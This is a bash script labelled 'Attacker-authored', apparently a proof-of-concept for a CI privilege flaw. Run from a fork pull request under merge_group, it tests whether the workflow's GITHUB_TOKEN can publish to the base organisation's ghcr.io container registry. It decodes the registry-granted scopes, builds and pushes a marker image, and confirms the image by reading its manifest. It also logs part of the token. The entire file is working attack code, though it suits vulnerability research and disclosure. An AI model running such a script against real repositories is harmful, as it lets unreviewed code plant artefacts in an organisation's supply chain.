#!/usr/bin/env bash
# Attacker-authored. Measures whether a FORK-authored workflow can PUBLISH to the
# base org's container registry. Same file runs on pull_request (control) and merge_group.
set -u
echo "PKG|CTX|event=${GITHUB_EVENT_NAME}|ref=${GITHUB_REF}|sha=${GITHUB_SHA}|repo=${GITHUB_REPOSITORY}"
# GUARD: GITHUB_TOKEN is NOT an automatic env var. An unset one makes every refusal below
# an artefact of an empty password, i.e. a VOID arm wearing a clean negative. Fail loudly.
if [ -z "${GITHUB_TOKEN:-}" ]; then
  echo "PKG|VOID|GITHUB_TOKEN-EMPTY-IN-ENV - every result below is meaningless"
  echo "PKG|DONE"; exit 0
fi
echo "PKG|TOKEN-PRESENT|len=${#GITHUB_TOKEN}|prefix=${GITHUB_TOKEN:0:4}"
NAME="${GITHUB_REPOSITORY,,}/pkgprobe"
TAG="arm-${GITHUB_EVENT_NAME}-${GITHUB_RUN_ID}"
echo "PKG|TARGET|ghcr.io/${NAME}:${TAG}"

# ---- 1. What does the REGISTRY itself authorise this credential to do? ----
# This is ghcr's own decision, not our narration: the JWT's access claim lists granted actions.
raw=$(curl -s -u "x:${GITHUB_TOKEN}" "https://ghcr.io/token?service=ghcr.io&scope=repository:${NAME}:push,pull")
jwt=$(printf '%s' "$raw" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))' 2>/dev/null)
if [ -n "$jwt" ]; then
  printf '%s' "$jwt" | cut -d. -f2 | tr '_-' '/+' | python3 -c '
import sys,base64,json
s=sys.stdin.read().strip(); s+="="*(-len(s)%4)
try:
    p=json.loads(base64.b64decode(s))
    print("PKG|GHCR-GRANTED|"+json.dumps(p.get("access")))
except Exception as e:
    print("PKG|GHCR-GRANTED|DECODE-FAIL|"+str(e))'
else
  echo "PKG|GHCR-GRANTED|NO-TOKEN|$(printf '%s' "$raw" | head -c 200)"
fi

# ---- 2. Actually attempt the publish (a grant line is a mechanism; a push is the impact) ----
mkdir -p /tmp/ctx
cat > /tmp/ctx/MARKER.txt <<EOF
ATTACKER-CONTROLLED ARTEFACT published by unreviewed fork PR code.
event=${GITHUB_EVENT_NAME} run=${GITHUB_RUN_ID} queue_ref=${GITHUB_REF}
EOF
printf 'FROM scratch\nCOPY MARKER.txt /MARKER.txt\n' > /tmp/ctx/Dockerfile
echo "${GITHUB_TOKEN}" | docker login ghcr.io -u x --password-stdin > /tmp/login.out 2>&1
lrc=$?; echo "PKG|LOGIN|rc=${lrc}|$(tail -1 /tmp/login.out)"
docker build -q -t "ghcr.io/${NAME}:${TAG}" /tmp/ctx > /tmp/build.out 2>&1
brc=$?; echo "PKG|BUILD|rc=${brc}|$(tail -1 /tmp/build.out)"
docker push "ghcr.io/${NAME}:${TAG}" > /tmp/push.out 2>&1
prc=$?
echo "PKG|PUSH|rc=${prc}"
sed 's/^/PKG|PUSH-OUT|/' /tmp/push.out | tail -8

# ---- 3. POST-STATE read from the registry, independent of docker's own exit noise ----
pull=$(curl -s -u "x:${GITHUB_TOKEN}" "https://ghcr.io/token?service=ghcr.io&scope=repository:${NAME}:pull" \
       | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))' 2>/dev/null)
code=$(curl -s -o /tmp/man.json -w '%{http_code}' -H "Authorization: Bearer ${pull}" \
       -H 'Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json' \
       "https://ghcr.io/v2/${NAME}/manifests/${TAG}")
echo "PKG|POSTSTATE-MANIFEST|${code}|$(head -c 220 /tmp/man.json)"
echo "PKG|DONE"
